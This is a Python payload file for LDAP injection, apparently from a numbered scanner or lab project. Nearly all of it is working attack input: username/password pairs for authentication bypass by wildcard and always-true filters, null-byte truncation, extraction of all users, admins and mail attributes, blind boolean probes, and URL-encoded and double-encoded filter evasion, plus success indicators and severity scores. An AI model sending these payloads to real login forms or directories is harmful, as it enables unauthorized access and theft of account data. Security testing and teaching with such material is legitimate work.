"""
ldap_payloads.py — LDAP injection payload database (Project #45)
"""

# ---- 1. DETECTION ----
DETECTION_PAYLOADS = {
    "basic_or":     ("*)(uid=*", "x"),
    "basic_and":    ("*)(&(uid=*", "x"),
    "basic_auth":   ("admin", "*)(uid=*"),
    "wildcard_pw":  ("admin", "*"),
    "error_based":  ("*)(invalid", "x"),
}

# ---- 2. AUTH BYPASS ----
AUTH_BYPASS = {
    "admin_known_pw":   ("admin", "admin123"),                 # baseline
    "wildcard_pw":      ("admin", "*"),                        # any password
    "or_always":        ("*)(uid=*)", "x"),                    # classic
    "or_filter":        ("*)(|(uid=*))(|(uid=*", "x"),
    "close_and_open":   ("*)(uid=*))(|(uid=*", "x"),
    "null_byte":        ("admin))%00", "x"),
    "cn_bypass":        ("*)(cn=*", "*)(cn=*"),
}

# ---- 3. DATA EXTRACTION ----
DATA_EXTRACTION = {
    "all_users":    ("*)(uid=*", "x"),
    "all_admins":   ("*)(role=admin", "x"),
    "all_mail":     ("*)(mail=*", "x"),
}

# ---- 4. BLIND LDAP ----
BLIND_LDAP = {
    "boolean_true":  ("*)(&(uid=*)(|(uid=*", "x"),
    "boolean_false": ("*)(&(uid=*)(|(uid=invalid", "x"),
}

# ---- 5. FILTER BYPASS ----
def bypass_payloads():
    """Return dict of technique -> (username, password)."""
    return {
        "raw":              ("*)(uid=*", "x"),
        "url_encoded":      ("%2a%29%28%75%69%64%3d%2a", "x"),
        "double_encoded":   ("%252a%2529%2528%2575%2569%2564%253d%252a", "x"),
        "mixed_case":       ("*)(UID=*", "x"),
        "comment":          ("*)(uid=*))%00", "x"),
    }

# ---- 6. INDICATORS ----
INDICATORS = {
    "auth_success":    ["Logged in as", '"status": "ok"', "status: ok"],
    "admin_leak":      ["role=admin", '"role": "admin"', "admin"],
    "all_users":       ["alice", "bob", "admin"],
    "wildcard_pw":     ["Logged in as admin"],
    "filter_reflect":  ['"filter":'],
    "error_leak":      ["invalid", "error", "exception"],
}

# ---- 7. LDAP SPECIAL CHARS (for reference) ----
LDAP_SPECIAL = ["*", "(", ")", "\\", "NUL", "/"]

# ---- 8. RISK SCORING ----
def score(issue_type):
    scores = {
        "ldap_detected":       "INFO",
        "auth_bypass":         "CRITICAL",
        "data_extraction":     "HIGH",
        "blind_ldap":          "HIGH",
        "priv_escalation":     "CRITICAL",
        "filter_bypass":       "MEDIUM",
    }
    return scores.get(issue_type, "MEDIUM")
